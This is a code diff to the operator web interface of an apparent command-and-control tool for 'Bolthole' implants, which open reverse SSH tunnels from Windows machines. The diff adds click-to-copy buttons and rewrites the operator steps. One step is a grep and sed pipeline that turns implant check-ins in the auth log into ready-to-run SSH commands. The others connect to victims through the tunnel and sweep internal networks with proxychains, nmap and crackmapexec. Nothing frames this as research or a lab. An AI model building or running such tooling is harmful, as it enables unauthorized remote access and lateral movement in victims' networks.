@@ -294,10 +294,14 @@ input[type=range]::-webkit-slider-thumb {
   background: var(--surface2); border: 1px solid var(--border); border-radius: 5px;
   padding: 10px 12px; font-family: monospace; font-size: .78rem; white-space: pre; overflow-x: auto;
   color: var(--text); cursor: pointer; user-select: text; line-height: 1.7;
-  transition: border-color .15s;
+  transition: border-color .15s; position: relative;
 }
 .cmd-block:hover { border-color: var(--accent2); }
 .cmd-block .cmd-comment { color: var(--text2); }
+.cmd-block::after { content: '⎘ copy'; position: absolute; top: 5px; right: 8px; font-size: .65rem; font-family: sans-serif; color: var(--text2); opacity: 0; transition: opacity .15s; pointer-events: none; }
+.cmd-block:hover::after { opacity: .65; }
+.cmd-block.cmd-copied { border-color: var(--accent) !important; }
+.cmd-block.cmd-copied::after { content: '✓ copied'; opacity: 1 !important; color: var(--accent); }
 
 /* ── Error banner ── */
 .error-banner { background: rgba(226,96,122,.1); border: 1px solid rgba(226,96,122,.3); border-radius: 6px; padding: 12px 16px; color: var(--red); font-size: .88rem; margin-top: 14px; display: none; }
@@ -900,6 +904,22 @@ function selectAllText(el) {
   sel.addRange(range);
 }
 
+function copyCmd(el) {
+  let text = '';
+  el.childNodes.forEach(node => {
+    if (node.nodeType === Node.TEXT_NODE) {
+      text += node.textContent;
+    } else if (node.nodeType === Node.ELEMENT_NODE && !node.classList.contains('cmd-comment')) {
+      text += node.textContent;
+    }
+  });
+  text = text.trim();
+  navigator.clipboard.writeText(text).catch(() => {}).finally(() => {
+    el.classList.add('cmd-copied');
+    setTimeout(() => el.classList.remove('cmd-copied'), 1100);
+  });
+}
+
 // ── Bolthole navigation ────────────────────────────────────────────────────
 async function goToBhStep2() {
   await saveC2Config(false);
@@ -1134,27 +1154,23 @@ function showResultsInModal(links, opsHtml) {
 
 function buildBoltholeOpsHtml(p) {
   return `<div class="ops-section">
-     <div class="ops-label">1. Identify target — user AND operator port from C2 auth log</div>
-     <div class="cmd-block" onclick="selectAllText(this)" title="Click to select all"><span class="cmd-comment"># Implant announces Windows identity + selected tunnel port before opening the tunnel.
-# Auth log format:
-#   Invalid user john.LAPTOP-ABC123.p31335 from 1.2.3.4 port 54321
-#                └─── windows user ───┘     └─ port ─┘
-# The .p&lt;PORT&gt; suffix is the dynamic tunnel port to use in step 2.</span>
+     <div class="ops-label">1. Identify target — outputs ready-to-run SSH connect command</div>
+     <div class="cmd-block" onclick="copyCmd(this)" title="Click to copy"><span class="cmd-comment"># Auth log format: Invalid user john.LAPTOP-ABC123.p31335 from 1.2.3.4 port 54321
+#                             └─ windows user ─┘ └─ port ─┘</span>
 
-journalctl -u ssh -f | grep "Invalid user"
-<span class="cmd-comment"># or on older systems:</span>
-tail -f /var/log/auth.log | grep "Invalid user"</div>
+journalctl -u ssh -n 100 | grep -oP 'Invalid user \\K\\S+\\.\\S+\\.p\\d+(?= from)' | sort -u | sed 's/\\([^.]*\\)\\..*\\.p\\([0-9]*\\)/ssh \\1@localhost -p \\2 -i operator_key/'
+<span class="cmd-comment"># older systems (auth.log):</span>
+grep -oP 'Invalid user \\K\\S+\\.\\S+\\.p\\d+(?= from)' /var/log/auth.log | sort -u | sed 's/\\([^.]*\\)\\..*\\.p\\([0-9]*\\)/ssh \\1@localhost -p \\2 -i operator_key/'</div>
    </div>
    <div class="ops-section">
      <div class="ops-label">2. Connect to target via reverse tunnel (run on C2)</div>
-     <div class="cmd-block" onclick="selectAllText(this)" title="Click to select all"><span class="cmd-comment"># Replace &lt;win-user&gt; and &lt;PORT&gt; with values read from the auth log above.
-# operator_key is in the build package.</span>
+     <div class="cmd-block" onclick="copyCmd(this)" title="Click to copy"><span class="cmd-comment"># Copy the SSH command printed by Step 1 and run it here.</span>
 
-ssh -i operator_key -p &lt;PORT&gt; &lt;win-user&gt;@localhost</div>
+ssh &lt;win-user&gt;@localhost -p &lt;PORT&gt; -i operator_key</div>
    </div>
    <div class="ops-section">
      <div class="ops-label">3. Route traffic through target network — SOCKS5 proxy</div>
-     <div class="cmd-block" onclick="selectAllText(this)" title="Click to select all"><span class="cmd-comment"># Add to /etc/proxychains4.conf:
+     <div class="cmd-block" onclick="copyCmd(this)" title="Click to copy"><span class="cmd-comment"># Add to /etc/proxychains4.conf:
 #   socks5  127.0.0.1  ${p.socks_port||1080}</span>
 
 proxychains4 nmap -sT -Pn 10.0.0.0/24
@@ -1162,7 +1178,7 @@ proxychains4 crackmapexec smb 10.0.0.0/24</div>
    </div>
    <div class="ops-section">
      <div class="ops-label">C2 host</div>
-     <div class="cmd-block">${p.ssh_user||''}@${p.ssh_host||''}  tunnel-range:${p.tunnel_port_range||''}  socks:${p.socks_port||1080}</div>
+     <div class="cmd-block" onclick="copyCmd(this)" title="Click to copy">${p.ssh_user||''}@${p.ssh_host||''}  tunnel-range:${p.tunnel_port_range||''}  socks:${p.socks_port||1080}</div>
    </div>`;
 }
 
